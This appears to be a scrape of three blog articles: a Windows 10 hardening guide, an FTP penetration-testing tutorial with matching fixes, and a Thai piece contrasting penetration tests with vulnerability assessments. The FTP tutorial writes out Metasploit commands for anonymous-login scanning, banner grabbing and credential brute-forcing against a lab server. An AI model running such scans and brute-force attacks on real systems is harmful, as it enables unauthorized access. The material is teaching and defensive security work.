If you are a student, many vendors offer cost-reduced software licenses (email them if they do not list it on their website) — and you can usually buy Windows for next to nothing at your Campus Technology Store. Get a Windows 10 Education or Enterprise license if you can.
If you insist on being a member of the Pirate Party, please proceed with caution! Download these files from within a VM — run any cracks, patches, keygens from a disposable VM — download trials from the vendor website and install those inside a dedicated VM. You cannot trust your software.
Malware will spread via your network, shared folders, and in some cases, even break out of the VM and compromise your host operating system. Always keep VMWare/VirtualBox and its guest-OS up to date.
If you are an IT professional, you cannot be doing this; you are part of the cyber security problem! Learn how to reverse engineer software yourself if you really cannot afford the license fees. You will soon discover you have solved both problems. Force yourself to adopt secure routines.
You have several options to secure your “data at rest” by encrypting it before writing it to disk. It is even possible to combine all three.
You can enable your Self-Encrypting Drive (SED) by setting a secure password when configuring your BIOS. This is not the same as setting a supervisor password!
Transparent full drive encryption on your Solid State Drive (SSD) has almost no performance downside. I do not have enough trust in Lenovo to rely on it solely.
Keep in mind that the encryption keys are kept inside your TPM chip, which is unlikely to survive a destructive hardware attack. Protect yourself by making regular backups.
BitLocker is only available for Pro, Enterprise and Education licensees of Windows 10. The keys are also kept inside your TPM chip. I do not trust my OS either, so some separation of duty seems in order.
There are advantages to using BitLocker though:
To enable BitLocker: File Explorer > Right click C > Turn on BitLocker.
I use VeraCrypt, a free and open-source (FOSS), cross-platform that passed an independent audit. You too can learn to memorize a 32+ character passphrase.
VeraCrypt supports encrypting non-system GPT partitions/drives.
To encrypt your entire drive, you need to partition your disk as an MBR (Master Boot Record) disk and not the default GPT (GUID Partition Table) format.
Converting later will require a full reformat or purchasing commercial partitioning software. You can also choose to use a VeraCrypt encrypted file container on top of BitLocker/SSD FDE.
The above information combined with the documentation should be sufficient for you to accomplish this. Read their security model to understand what it does and does not protect you from.
Your Basic Input Output System (BIOS) is the codebase which initializes your hardware and loads the files that boot your Operating System.
If you are not planning on using VMWare, dual-booting Unix nor use VeraCrypt for FDE:
Device Guard, when configured, locks your device down so that it only runs trusted applications you have defined through your code integrity policies. More information is covered by this Microsoft Technet article.
Since I am planning on using VeraCrypt FDE, and dual-booting Windows 10 Pro with the future Qubes OS 4:
Save and exit settings to reboot from your Installation Media.
I would only recommend installing v1703 fresh, as the built-in upgrade process resulted in a hobbled and inconsistent OS.
None of the Windows recovery options or troubleshooting tools resolved this; I ended up using the “Reset this PC” functionality.
I’ve pushed on and am now single-booting Windows 10 “Redstone 2” with TPM 2.0, Device Guard and Bitlocker enabled.
As stated, I recommend everyone to start with a fresh installation of Windows 10. Modern malware is very persistent, bootkits and rootkits are hard to detect, Microsoft upgrades have always been buggy.
During installation and setup please:
Your system remains offline.
I highly recommend side-loading essential applications, vendor drivers, and Windows updates.
When you first boot up, Windows is far from trustworthy. It is full of holes and reporting back to its overlords. At the very least you are vulnerable to local MITM attacks.
Complete the above installation tasks. Your system remains offline.
Until we get into Group Policy Editor and Windows Firewall territory, I recommend running a few consumer tools to kick off the process:
Unless manually enforced using a Group Policy Object, Microsoft will re-enable telemetry, firewall rules, and unwanted features during the next Feature upgrade or if you ever run System File Checker (sfc).
You would be wise to update & re-run your preferred privacy tools after a major Windows 10 release — these projects do a good job staying on top of things. Check their compatibility first!
They all seem to behave slightly different. Use Process Monitor to reverse engineer their actions if you want to enforce it using Group Policy/Scripts (or across AD connected workstations).
Your system remains offline.
One of the best things you can do to improve your security is install and configure the Enhanced Mitigation Experience Toolkit (EMET).
Carnegie Mellon University recently argued its continued benefits for Windows 10 users despite Microsoft announcing its End of Live by July 31, 2018. They have incorporated some of its protections in v1703.
At time of writing, I had a small issue with Chrome after enforcing EMET’s Popular Programs via Group Policy. The solution was to configure it via the GUI and turn off ‘EAF: Extended Table Access Filtering Plus’ for Chrome only.
I also like the idea behind 0patch.com.
Your system remains offline.
We want to reduce our systems’ attack surface as much as possible: which means removing features and outdated capabilities we will never use.
You will want to go over which Windows Features to turn off.
I enabled the Hyper-V and IIS Management Tools as well as a few Device Lockdown features.
But removed .NET 3.5, SMB v1 and PowerShell 2. You could go much further.
For the v1703 remake, I disabled all Windows features and hadn’t had an issue yet.
Your system remains offline.
When you run Sysinternals Autoruns with administrative privileges, it becomes a great tool to start managing the programs and services that are set to run at one point or another.
For now, under Administrative Tools > Services (or by running ‘services.msc’) I disabled Geolocation for privacy and a few services that are vulnerable to Bloodhound and Responder:
Unfortunately, with the v1603 Anniversary Update, Microsoft removed our ability to enforce this from Group Policy.
Your system remains offline.
There are a few modifications to we should make to our Wifi Settings and Network Adapters.
First, make it more difficult to track your location across WiFi networks:
You could use Technitium MAC Address Changer’s command-line to accomplish this for your Ethernet LAN interface.
Right-click on any Network Adapter > Properties and uncheck:
In that same window, select ‘Internet Protocol Version 4 (TCP/IPv4)’ and click the Properties button. From there click the Advanced button, uncheck ‘Register this connection’s addresses in DNS’ on the DNS tab, and select ‘Disable NetBIOS over TCP/IP’ on the WINS tab.
Repeat these steps for all appropriate networked adapters. Your system remains offline.
I run most of my tools from inside a Virtual Machine. I have both Oracle VirtualBox and VMWare Workstation installed. You are advised to do the same.
Those files I receive via my mail client and open up with my favorite office suite pose the highest risk. Let alone the malicious samples I eagerly download with my web browser!
I do have a few tools I use outside of a VM:
I quickly uninstalled the following:
*I grabbed the latest drivers for my network card from Intel.com (Lenovo is always behind). For these drivers I choose not to install Software Extensions nor the Administrative Toolkit.
A reboot may be required. Keep your system offline.
Ever since OpenDNS rebranded itself as an enterprise security company and finally implemented RFC compliant DNS (no custom redirects, no ads), they have become a great alternative over your ISP’s or Google DNS
You can increase your internet speed and improve your security posture by setting the DNS servers (on your device and router) to these IP addresses:
By default OpenDNS blocks resolution of known malicious domains only.
If you sign up for a free account, you can shield your networked devices even further, useful when you have kids or a Social Media addiction.
This does not stop a Man-in-the-Middle (MiTM) attack. Your “URL to IP address” translation requests are not encrypted!
The Domain Name Service (DNS) is the reason your Internet Service Provider (ISP) knows exactly which websites you are visiting.
Many countries, including Germany, the United Kingdom, and the United States, allow their Federal police to hack their citizens.
DNSCrypt is an excellent way to verify that responses originate from the chosen DNS resolver and have not been spoofed.
It does not provide encryption, prevent “DNS leaks”, or a third-party DNS resolver from logging your activity.
Higher level TLS protocol, as used in HTTPS and HTTP2 (SPDY), also leak websites host names in plain text, rendering DNSCrypt useless as a way to hide this information.
SimpleDNSCrypt is the most up to date implementation for Windows 10. I opted to disable IPv6 and will revisit the hidden (virtual) NICs at another time.
Restart your system. It should be ‘OK’ to take it online now.
Your internet history is accessible for at least 48 institutions without a warrant in the United Kingdom. Other countries are doomed to follow.
“Privacy is a transient notion. When people stopped believing God could see everything, governments realized there was a vacancy open.” — Roger Needham
It is strongly recommended to encapsulate all network traffic beyond your own country’s borders using a Virtual Private Network.
At best a VPN provides more privacy. Do not count on it for anonymity:
Personally, I run a hardened Linux instance with Algo VPN that sets up a secure personal IPsec VPN for my mobile devices, and for when I’m connecting over a public WiFi.
We use Streisand for instances we tear down at the end of the day. It generates a user-friendly HTML file with instructions to connect to the newly provisioned server running L2TP/IPsec, OpenSSH, OpenVPN, Stunnel, and a Tor bridge. Easy to share with others.
Not all VPS servers are alike — Lin-ode is a personal favorite of mine.
I consider Google Chrome one of the more secure (by design) browsers.
Because there is an open-source version, someone created UnGoogled Chromium stripped free of Google integration, resulting in a more private (and so much faster!) browsing experience.
If you opt for a more traditional approach and fire up your Microsoft Edge browser to download Chrome or Firefox, be sure to ignore Bing’s and Window’s attempts to dissuade you!
99.9% of web exploits, tracking and fingerprinting starts with malicious JavaScript execution hosted by known malware domains
Review the options of every browser you have installed, including Internet Explorer/Edge. Take the time to configure each plugin on ‘expert’ mode!
Windows Updates (and upgrades) tend to ‘flip settings’ back to their insecure defaults. Microsoft only seems to respect settings enforced using central Group Policy Objects (GPOs).
Even if you are not a seasoned IT professional — you will love being able to manage most settings for all user accounts from a single program (‘gpedit.msc’). An up to date settings reference for Windows 10 is available in Excel format.
You can extend the capabilities of your Group Policy Editor by deploying Administrative Templates (.adml & .admx files).
For example, to control EMET with a GPO:
Repeat this for this set of Administrative Templates provided by Microsoft (the v1703 templates can be downloaded here)
Templates are also available for Microsoft Office 2010 / 2013 / 2016 / 2007, LibreOffice as well as Chrome and Firefox.
If you get an Access Denied error, you’ll have to take ownership of the PolicyDefinitions folder first:
We will use some of these extended capabilities to lock down the system, making it harder for anyone to disable your protections.
A reboot may be required to load these extensions.
Several well-funded organizations give advice on what makes a configuration “secure.”
Establishing a Secure Host Baseline (SHB) is one of the NSA’s top 10 mitigation strategies.
I like the DoD Secure Host Baseline project on Github. It is a collection of PowerShell scripts that are relatively painless to apply.
Hit the Windows Key + X keyboard shortcut and launch Windows PowerShell (Admin). Run all the commands below from there:
Download the repository as a ZIP file, and unlock it:
Extract the ZIP file, remove “-master” from both directories created.
In the PowerShell terminal, navigate down to the directory, and import the Group Policy PowerShell module:
You will need to extract the Microsoft Local Group Policy Object (LGPO) utility to a known location. Make sure to reference full paths in the command below to avoid any errors.
I have no need for cryptographic DoD certificates:
You will notice that, for example, more of your Chrome settings are now enforced using group policy — some of which I will reverse.
That said, it is not perfect:
A reboot is required to apply all changes successfully.
Microsoft has released an excellent tool which allows you to apply their “Microsoft ”Recommended Security Baselines.”
This tool will soon be replaced by the DSC Environment Analyzer (DSCEA), likely before the v1703 security baselines is ready for production, so keep that in mind.
Install and configure Security Compliance Manager 4 (SCM). Be aware that this tool requires .Net Framework 3.5 (Includes .Net 2.0 and 3.0) and installs SQL Server 2008 Express (x86) — increasing your attack surface.
Once installed, under the ‘Get knowledge’ column, you can download Microsoft baselines automatically for Windows 10 v1607, Internet Explorer 11 and Office 2007/2010/2013.
Check out the Attachments\Guides section for the SecGuide ADMX/ADML to install and any supplemental documentation. You have to Duplicate a baseline before it can be customized.
If you wish to apply any SCM baseline to your system, you can export a GPO backup folder and use the LGPO tool’s /g switch.
Another tool to geek out over is the Microsoft Policy Analyzer tool, which shows the differences between your local policy/registry and as many GPO backups as you Add & select.
In the Policy Viewer, the information displayed can be filtered and searched, or exported to Excel format. Conflicts are shown in yellow.
The DoD Secure Host Baseline template has the more secure defaults in most cases, but you will find that a hybrid of both fits your particular use-case.
There is no substitute to manually stepping through my options with the Group Policy Editor (by running ‘gpedit.msc’). Improve its readability by sorting the ‘Setting’ or ‘State’ column.
The wording for some settings can be very counter-intuitive. Luckily each option has a clear description.
Most of the relevant settings are found under these Policy Paths:
Apply any changes by execution the command below in any admin shell:
It can be very insightful to repeat this step as new CIS benchmark documents are released.
The information the Policy Analyzer gives me allows me to quickly combine the best of two baselines together and customize my settings as desired.
Despite primarily working from VMWare, some settings aimed at improving security would interfere with me during a penetration test. Such as those limiting the number of simultaneously active network adapters or prevent me from creating a layer 2 MAC bridge between them.
As you are stepping through your options, you will not only discover Chrome has a Dinosaur Easter Egg Game, but that many apps have some form of:
The DoD baseline has done a good job disabling most, but not all. Note that unless you have a Windows Enterprise or Education license, you will not be able to disable Telemetry entirely.
Make sure to enforce strict reapplication of critical policies:
I will never need to remotely login to my workstation:
Windows 10’s DNS Client just accepts whichever response it receives first, not necessarily the one from your intended DNS server.
We can later enforce this policy using Windows Firewall as a technical control.
Configure the Windows Network Time Protocol (NTP) Client to use trusted, non-Microsoft, servers — perhaps even authenticated ones. At least till Google’s ‘roughtime protocol’ is synchronizing our clocks.
You can enforce the use of modern TLS standards system-wide:
To determine which ECC curves are supported on your system, use the following command:
This usually breaks older applications like SQL Server 2008 Express (Windows Event Viewer is your friend).
Lucky for us Google Chrome is state of the art:
Review the Control Panel > Internet Options > Advanced tab and uncheck ‘Use HTTP2’, check ‘Send Do Not Track requests’. Disable WPAD on the Connections tab > LAN Settings > uncheck ‘Automatically detect settings’.
Re-configure Microsoft EMET for maximum security:
At time of writing, I had a small issue with Chrome after enforcing EMET’s Popular Programs via Group Policy. The solution was to configure it via the GUI and turn off ‘EAF: Extended Table Access Filtering Plus’ for Chrome only.
It is recommended to configure additional LSA Protection to defeat tools like MimiKatz.
Go back and enable ‘LSA Protection’ if all your drivers are properly signed.
WDigest Authentication should already be disabled to prevent transmission of credentials across the network as a weak MD5 hash or message digest.
If you are installing Microsoft Office outside of a VM (not recommended!):
You should also disable Office OLE Automation for Outlook. Note that an attacker can still embed code inside Office documents.
Registry changes require a reboot.
Run the NetCease PowerShell script to mitigate against a method Bloodhound uses.
Restart the Server service (or reboot).
We already disabled the ‘WinHTTP Web Proxy Auto-Discovery Service’ service and unchecked the ‘Auto-detect settings’ Internet Options property.
Registry changes require a reboot.
Malware often abuses functionality that allows apps and processes to be automated; Windows Script Host is a classic example.
We can disable most of the Windows Scripting capabilities:
Disabling WSH may prevent you from running .bat batch files.
Windows Firewall (WFAS) is our technical security control that enforces our intended policies and supplements them when needed.
For example, we cannot use Group Policy to reinforce that our DNS requests are only sent to the local DNSCrypt proxy or specific OpenDNS servers.
I have extensively experimented with various alternatives and graphical Windows Firewall front-ends to speed up my workflow — all had significant usability or security flaws.
You can see every existing Firewall rule using the ‘Windows Firewall with Advanced Security’ desktop app (or by running ‘WF.msc’).
Firewall settings and rules are best created using the now familiar Group Policy Editor. Under Computer Configuration > Windows Settings > Security Settings > Windows Firewall with Advanced Security.
First add a rule that blocks all outgoing and incoming traffic:
Important: by default Windows Firewall has a legion of local inbound and outbound exceptions (‘WF.msc’). Disabling these in ‘WF.msc’ is only a temporary fix.
Unless you create an explicit Block rule for each or disable merging of local firewall rules for each profile’s settings using Group Policy (‘gpedit.msc’), Microsoft will re-enable them after a major update. Further more applications often create their own exceptions.
Now let’s allow our Windows DNS Client to function:
Repeat the same steps for ‘svchost.exe’ to allow our Windows NTP Client (UDP / 123) and Windows Update (TCP / 80,443).
A few examples of processes I allow to make outbound TCP connections:
My inbound rules consist solely of Core Networking and specific application exceptions.
Force yourself to apply the principle of minimal privilege. GoogleUpdate and HitmanPro should only connect to port 443 over TCP. ‘Connected User Experiences and Telemetry DiagTrack’ should be explicitly blocked.
One of the most powerful defense strategies is whitelisting which applications are allowed to run with Windows AppLocker.
By now AppLocker is already running in ‘Audit only’ mode — all processes executed by users are logged to the Event log, including the full path of the program.
All AppLocker policies are created and managed using Group Policy under:
Your goal is to whitelist only those applications you trust, by path but preferably by their digital signature.
Despite dedicating over 6,000 words to the topic, there is always more we can do and new attack vectors are published every month.
I want to revisit the WindowsSpyBlocker GitHub project, as it has a robust approach to the problem and is continuously updated. Installing an application layer proxy and generating a unified hosts file yourself is strongly recommended. I will probably incorporate this with Blackbird.
Sysmon is another free tool from Windows Sysinternals.
It is a background monitoring tool that logs to the Windows event log — is very feature rich — and gives you more visibility into the live state of your endpoint.
See the author’s presentation “How to go from Responding to Hunting with Sysinternals Sysmon” and this write-up by the founder of Graylog and webcast by BHS.
In the fight against ransomware, bootkits & rootkits, Cisco’s Talos has released the MBR Filter Driver. This essentially sets your Master Boot Record to read-only.
It is relatively easy to install. Read the original blog post here. This tool is not for UEFI/SecureBoot systems.
A free and open-source Host-based Intrusion Detection System with very powerful correlation and analysis engine:
We monitor all our Linux, OpenBSD, MacOS and Windows hosts with it. If you want to run it locally, you will need to set it up in a host-only Linux VM as Windows support is limited to an installable agent. Works great in combination with Graylog!
Solely relying on a username/password or even out-of-bound SMS authentication using your cell phone will not be secure enough in 2017 (NIST 800–63A/B/C). U2F security keys are your best hope against account takeovers.
I highly recommend buying and learning how to use a Yubikey. The YubiKey 4 is now closed-source but the NEOs are still using open-source code others can independently verify. It integrates well with Windows 10.
Click the ♡ to recommend this article.
Hacker Noon is how hackers start their afternoons. We’re a part of the @AMI family. We are now accepting submissions and happy to discuss advertising & sponsorship opportunities.
If you enjoyed this story, we recommend reading our latest tech stories and trending tech stories. Until next time, don’t take the realities of the world for granted!
Written by
","['About', 'Help', 'Go Home', 'many graphical ', 'UEFI SecureBoot', 'NIST 147/147b.', 'Device Guard', 'Automatically enabling', '(1)', '(2)', '(3)', '(4)', '/r/tronscript.', 'WindowsSpyBlocker hosts', 'Blackbird', 'evaluate WPD.', 'BiniSoft', 'ElevenPaths', 'Beamgun', 'LAN Turtles', 'Rubber Duck', 'preferred AntiVirus', 'Heimdal FREE', 'Sysinternals Suite!', 'debloat-windows-10', 'Bandizip', 'BleachBit', 'CherryTree', 'Divvy', 'GPG4Win', 'Greenshot', 'Glary', 'Hash Explorer', 'herdProtect', 'HitmanPro', 'KeePass', 'MacDrive', 'Navicat', 'Nmap', 'paint.NET', 'Pritunl', 'Tmac', 'Resilio Sync', 'SimpleDNSCrypt', 'Sublime Text', 'SunsetScreen', 'VLC', 'VirtualBox', 'VMWare Workstation', 'WinSCP', 'Wireshark', 'Xmind', 'XnViewMP', 'Adobe Flash', 'Java', 'Skype', 'Intel ME', 'manual installation.', 'StartPage', 'ScriptSafe', 'Ublock Origin', 'uMatrix', 'HTTPS Everywhere', 'install ScriptSafe', 'Ublock Origin', 'HTTPS Everywhere.', 'install uMatrix', 'Ublock Origin', 'HTTPS Everywhere.', 'ultrasound audio.', 'VMWare compatibility', 'to TLS 1.2', 'Sysinternals Autoruns', 'Use AccesEnum', 'Windows 10', 'Privacy', 'Cybersecurity', 'Microsoft', 'Security']"
Penetration Testing of an FTP Server - Shahmeer Amir,https://shahmeeramir.com/penetration-testing-of-an-ftp-server-19afe538be4b?source=tag_archive---------1-----------------------,"Welcome to Internal penetration testing on FTP server where you will learn FTP installation and configuration, enumeration and attack, system security and precaution. As you know that File Transfer Protocol (FTP) used for the transfer of computer files between a client and server in a network via port 21.
Requirement
FTP Server: ubuntu
Attacker system: Kali Linux
Client system: window
FTP Installation
Vsftpd stand for Very secure FTP daemon is an FTP server for Unix-like systems, including Linux.
Let’s start by typing following command to install vsftpd for FTP service.
apt-get install vsftpd
This will start FTP service on port 21
Scanning plays an important role in penetration testing because through scanning attacker make sure which services and open ports are available for enumeration and attack.
Here we are using nmap for scanning port 21.
nmap -p 21 192.168.0.106
If service is activated in targeted server then nmap show open STATE for port 21.
FTP users may authenticate themselves with a clear-text sign-in protocol, normally in the form of a username and password, but can connect anonymously if the server is configured to allow it.
If anonymous login is allowed by admin to connect with FTP then anyone can login into server. An attacker can easily search for anonymous login permission using following metasploit exploit.
use auxiliary/scanner/ftp/anonymous
msf auxiliary(anonymous) >set rhosts 192.168.0.106
msf auxiliary(anonymous) >exploit
From given image you can observe that it is showing permission READ from FTP server.
Connect client to FTP Server through WinSCP
Now let’s ensure whether we can connect to FTP server as anonymous user or not.
Protocol to: FTP
Encryption To: No Encryption
Host name: IP of the FTP Server
Port: 21
Username and Password: anonymous: anonymous.
Click on login
Ohh!! Great, we have got FTP access through anonymous user.
Similarly an attacker can also get access of your FTP server therefore it is quite important for admin that he should not give any permission to anonymous user for login into server.
Again in order to secure your server from anonymous user login then follow given below steps:
Now repeat the attack to verify for anonymous login permission using metasploit as above. But this time exploit will fail to take out information of anonymous user login permission which you can confirm from given below image.
An attacker always perform enumeration for finding important information such as software version which known as Banner Grabbing and then identify it state of vulnerability against any exploit.
Open the terminal in your kali Linux and Load metasploit framework; now type following command to scan for FTP version.
use auxiliary/scanner/ftp/ftp_version
msf auxiliary(ftp_version) > set rhosts 192.168.0.106
msf auxiliary(ftp_version) > exploit
From given image you can read the highlighted text which is showing vsftpd 3.0.2 is the installed version of FTP on target’s system.
As we had discussed above how a banner grabbing can expose loopholes of any software or service running on remote system therefore after installing any service always hide their software versions.
Admin should make following changes in their configuration file to prevent banner information.
Now save the whole text file after modification as shown in given image. Now it will not disclose banner information. Now restart the service using following command.
service vsftpd restart
Let’s verify version of running service after hiding banner through nmap version scan.
nmap -p 21 -sV 192.168.0.106
Wonderful!! We are successful in hiding banner which you can confirm from given image.
Though admin has hide the banner and disabled anonymous user but still attack has potential to steal credential for unauthorized access.
An attacker can take help of sniffing tools which can sniff the data packet travelling between server and client in a network and retrieve credential, this is known as sniffing, after then use them for unauthorized access. As we have discussed above FTP users may authenticate themselves with a clear-text sign-in protocol for username and password.
Similarly we had captured TCP packet through wireshark for sniffing FTP credential, from given image you can observe User: raj and password: 123 had login successfully.
Use SSL Certificate to prevent Credential stealing
SSL stands for Secure Sockets Layer, the protocol which provides secure, encrypted communications between server and client, this encrypt data packet travelling between server-client networks.
Although attacker can sniff network data packet but will be not able to read fetched information because entire data will show in the form of cipher text.
Here administrations need to generate their own SSL certificate for secure authentication. Make the directory where the SSL certificate keys will be stored.
mkdir /etc/ssl/certificates
Type following command which generate a SSL certificate inside certificates directory using rsa: 2048 encryption valid for 365 days.
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/certificates/vsftpd.pem -out /etc/ssl/certificates/vsftpd.pem
For generating new private key it requires information such as Country name, state, email address and etc as shown given below image.
Now we need to open vsftpd.conf file for changing default setting by adding few line at the end of file.
rsa_cert_file=/etc/ssl/certificates/vsftpd.pem
rsa_private_key_file=/etc/ssl/certificates/vsftpd.pem
ssl_enable=YES
allow_anon_ssl=NO
force_local_data_ssl=YES
force_local_logins_ssl=YES
ssl_tlsv1=YES
ssl_sslv2=NO
ssl_sslv3=NO
require_ssl_reuse=NO
ssl_ciphers=HIGH
You can confirm it as shown in given image now save the changes and restart the service.
service vsftpd restart
Now let’s ensure whether we can connect to FTP server as anonymous user or not.
Protocol to: FTP
Encryption To: TSL/SSL Explicit encryption
Host name: IP of the FTP Server
Port: 21
Username and Password: raj: 123
Click on login
Now server will send certificate to authorized user click on yes to store certificate and continue the encrypted connecting.
If attacker will sniff network packets he will get cipher text as shown in given image. In this way we can prevent sniffing from stealing credential in any network.
Another way to steal credential is Brute force attack on FTP Server using Metasploit.
Open the terminal in your kali Linux and Load metasploit framework now type following command to Brute force FTP login.
use auxiliary/scanner/ftp/ftp_login
msf auxiliary(ftp_login) > set rhosts 192.168.01.106
msf auxiliary(ftp_login) > set user_file /root/Desktop/user.txt
msf auxiliary(ftp_login) > set pass_file /root/Desktop/pass.txt
msf auxiliary(ftp_login) > set stop_on_success true
msf auxiliary(ftp_login) > exploit
From given image you can observe that our FTP server is not secure against brute force attack because it is showing matching combination of username: raj and password: 123 for login.
Once attack steals your username and password, he try to login into server as authorized user and then can perform mischievous action such as steal your important data or replace with malicious file.
Bravo!! You can observe that using raj: 123 we had login successfully
Hence our server is not secure against such kind of attack so let’s protect our FTP server.
A threshold account lockout policy in windows which locked an account after certain numbers of ttempt that can be possible in UNIX also through Iptables chain rule.
Here admin can set iptable chain rules for certain number of login attempts and if user crossed the define number then account will get locked for some time period as specified by admin.
Type the given below command to set iptable chain rule for account lockout policy:
iptables -I INPUT -p tcp –dport 21 -i eth0 -m state –state NEW -m recent –set
iptables -I INPUT -p tcp –dport 21 -i eth0 -m state –state NEW -m recent –update –seconds 120 –hitcount 3 -j DROP
Now this above rule will allow only 3 chances for login into FTP server otherwise locked the account for 120 seconds (2 minutes).
service vsftpd restart
Let’s ensure iptable chain rule working by making brute force attack as above.
Great!! It has prevented by stopping brute force after 3 attempts but will get activated after 2 minute therefore admin should locked the account for long period of time.
Admin can take help vsftpd.log to view client IP who try to connect with vsftpd server.
cd /etc/vsftpd.log
tail vsftpd.og
Now open hosts.allow file from inside /etc to allow valid user to connect with server securely through specific IP.
At the end of text file enter specific IP to whom you want to give permission for establishing connection as shown in given image.
vsftpd: 192.168.0.104
It quite important that admin should restrict all IPs other than allowed IP (192.168.0.106) to protect network from establishing connect from unknown IP.
Open /etc/hosts.deny and specify list of hosts whom you want don’t to allow accessing into the system.
Vsftpd: All
Now open configure file of vsftpd and add following lines:
# TCP Wrappers
Tcp_wreappers= Yes
Restart the service vsftpd “service vsftpd restart”
When valid user try to connect with another IP then server will not allow established connection as shown in given image.
As we know port 21 is use as default port for FTP service therefore we can also secure port from 21 to another port.
Open vsftpd.conf file and follow given bellow steps:
Now try to connect with FTP server via port 5000 with valid user credential and IP.
Great!!! We are successfully connected with FTP server via port 5000 in this way internal penetration testing helps us in system and network security.
Note: Always restart the vsftpd service after making any changes in its configuration file.
Written by
","['About me', 'Publications', 'Achievements', 'News', 'Contact', 'Hacking', 'Ftp', 'Cybersecurity', 'Ethical Hacking']"
การทำ Penetration Test แบบมืออาชีพ - Nontawatt Saraman - Medium,https://medium.com/@nontawatt/%E0%B8%81%E0%B8%B2%E0%B8%A3%E0%B8%97%E0%B8%B3-penetration-test-%E0%B9%81%E0%B8%9A%E0%B8%9A%E0%B8%A1%E0%B8%B7%E0%B8%AD%E0%B8%AD%E0%B8%B2%E0%B8%8A%E0%B8%B5%E0%B8%9E-f72e63213457?source=tag_archive---------6-----------------------,"หลายคนคงสงสัยว่า Penetration Test กับ Vulnerability Assessment มันแตกต่างกันอย่างไง วันนี้เราสามารถกระจ่างกับ 2 ศัพท์นี้กันคำว่า Penetration test คือการทดสอบเพื่อหาช่องทางในการเข้าถึงระบบ (Exploit) ซึ่งการเข้าถึงระบบโดยผ่านช่องโหว่ที่พบอาจเป็น 0day ที่ยังไม่พบการแจ้งเตือนจากผู้ผลิต (Vendor) และการกระทำใดๆที่อาจทำให้ผู้ว่าจ้างได้ทราบถึงความเสี่ยง เสมือนปฎิบัติจริงการเป็นแฮกเกอร์เพื่อเจาะระบบ
ส่วนคำว่า Vulnerability Assessment คือ การประเมินหาความเสี่ยงที่เกิดจากช่องโหว่ที่ค้นพบ ตามช่องโหว่ที่มีความเสี่ยง ซึ่งส่วนใหญ่แล้วเป็นความเสี่ยงที่ปรากฎต่อสาธารณะแล้วตาม CVE (Common Vulnerabilities and Exposures)ความแตกต่างทั้ง 2 คำนี้ก็คือ Pen-test นั้นคือการทดสอบเจาะระบบแบบแฮกเกอร์ เพื่อประเมินความเสี่ยงของธุรกิจหรือองค์กรนั้น ส่วน VA จะเน้นตรวจหาช่องโหว่ที่เป็นสาธารณะที่มีการเผยแพร่ช่องโหว่นั้นแล้ว เพื่อไม่ให้ถูกโจมตีจากผู้ไม่ประสงค์ดีได้ ทั้งคู่นี้จำเป็นต้องออกรายงานถึงระดับความเสี่ยงให้ผู้ว่าจ้างนั้นได้รู้ถึงภัยอันตรายที่อาจเกิดขึ้น
ดังนั้นหากเราพิจารณาดีๆ แล้วการทำ Penetration test จะเกิดก่อนการทำ Vulnerability Assessment อยู่ยกเว้นในบางกรณีที่ลูกค้าหรือผู้ใช้บริการทราบถึงช่องโหว่แล้วแต่ยังไม่สามารถประเมินค่าช่องโหว่ได้ตรงนี้ก็จะกระโดดไปทำ Vulnerability Assessment ได้ทันที แต่หากไม่สามารถระบุช่องโหว่อะไรได้เลยสิ่งแรกที่เราควรทำคือการทดสอบเจาะระบบเพื่อหาช่องทางในการเข้าถึงระบบเสียก่อน จึงเกิดเป็นการทำ Penetration test
การทำ Penetration test และ Vulnerability Assessment มีหลักการง่ายๆ ที่ทางทีมงาน SRAN ได้รวบรวมและสรุปเป็นขั้นตอนการปฏิบัติงานที่กระชับขึ้นและสามารถใช้ได้ทุกสถานะการณ์โดยสามารถแบ่งเป็นเนื้องานได้ดังนี้
การทำ Penetration test (การทดสอบเจาะระบบในเชิงลึก) ทั้งที่เกิดจากภายนอกระบบและภายในระบบเครือข่ายองค์กร ซึ่งการทำงานประเภทนี้ควรได้รับการอนุญาตจากบริษัท,องค์กรที่ว่าจ้างและมีการทำสัญญาการไม่เผยแพร่ความลับ และให้ดีกว่านั้นคืออาจต้องมีการเตรียมการกับผู้ดูแลระบบบริษัท , องค์กรให้ทราบถึงช่วงเวลาในการปฏิบัติงานที่แน่นอน เพื่อจะได้ระบุได้ว่าการโจมตีเกิดจากการทดสอบเจาะระบบจากทีมงานไม่ใช่นักโจมตีระบบอื่นที่ไม่เกี่ยวข้องในงาน ซึ่งส่วนนี้หากองค์กรมีระบบตรวจจับผู้บุกรุก IDS (Intrusion Detection System) ไม่ว่าเป็นระดับ Network หรือ Host base ก็จะเห็นความผิดปกติที่เกิดจากการทำการประเมินความเสี่ยงได้จาก Log ที่เกิดขึ้นบนอุปกรณ์ ซึ่งสามารถลัดขั้นตอนการทำประเมินความเสี่ยงโดยใช้อุปกรณ์ประเภทที่สามารถวิเคราะห์ Log files ที่เกิดบนระบบเครือข่ายคอมพิวเตอร์ก็ได้ เรียกว่าการทำ Passive vulnerability assessment
